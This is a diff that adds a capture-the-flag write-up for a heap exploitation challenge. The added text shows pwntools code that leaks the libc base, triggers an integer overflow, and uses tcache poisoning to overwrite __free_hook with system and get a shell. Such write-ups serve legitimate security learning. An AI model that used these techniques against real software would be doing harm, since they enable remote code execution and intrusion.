@@ -193,11 +193,58 @@ if __name__ == "__main__":
 
 ```
 
+ **NB : I PATCHED THE BINARY USING PWNINIT**
+
+### First Step We Leak Libc
+
+```python
+    alloc(5,1)#0 1 2 3 4 # We Allocate 5 chunks of large size so when freed it will contain fd and bk pointers which are main_arena addressess.
+    alloc(1,3)#5 Consolidation Prevention
+    alloc(int(2**32) - 6 + 3,4) # Integer Overflow Attack ( to satisfy our condition about counter1 != counter2 && counter1 < counter2 )
+    time.sleep(20) 
+    free()  # GOES TO TCACHE BIN 
+    free()  # THIS IS WHERE OUR CHUNK THAT HAVE LIBC ADDR 
+    view(4)
+    base = u64(p.recv(6).ljust(8,b"\x00")) - 0x1ebbe0
+    log.success('LIBC BASE => ' + hex(base))
+    pause()
+```
+### Second Step We do some Calculation To Pop A Shell
+```python
+    system = base + libc.sym['system'] # Target to execute is system("/bin/sh");
+    free_hook = base + libc.sym['__free_hook'] # we are going to overwrite free hook with system address
+```
+
+### Final Step Create Overlapping Chunks To Perfom Tcache Poisining
+```python
+    alloc(4,2)
+    free()
+    free()
+    time.sleep(0.5)
+    edit(6,128,p64(free_hook))
+    alloc(2,2)
+    edit(7,128,p64(system))
+    alloc(2,1)
+    edit(9,128,b"/bin/sh\x00")
+```
+Now free hook is succesfully overwritten with system address 
+we allocated a chunk and we put our string /bin/sh in it 
+now trigger the shell we just free the last chunk which contains our string so instead of free(note[9]) it just goes like system(note[9]) which is system("/bin/sh\x00");
+```python
+    free()
+``` 
+Executing The exploit and sending **cat flag.txt** We Get  
+> retr0{FAKE_FUCKING_FLAG}
+I hope i made everything clear . 
+Thanks ! .
 
 
 
 
-
-
+```
+References :
+https://ctf-wiki.mahaloz.re/pwn/linux/integeroverflow/intof/
+https://ctf-wiki.mahaloz.re/pwn/linux/glibc-heap/use_after_free/
+```
 
 
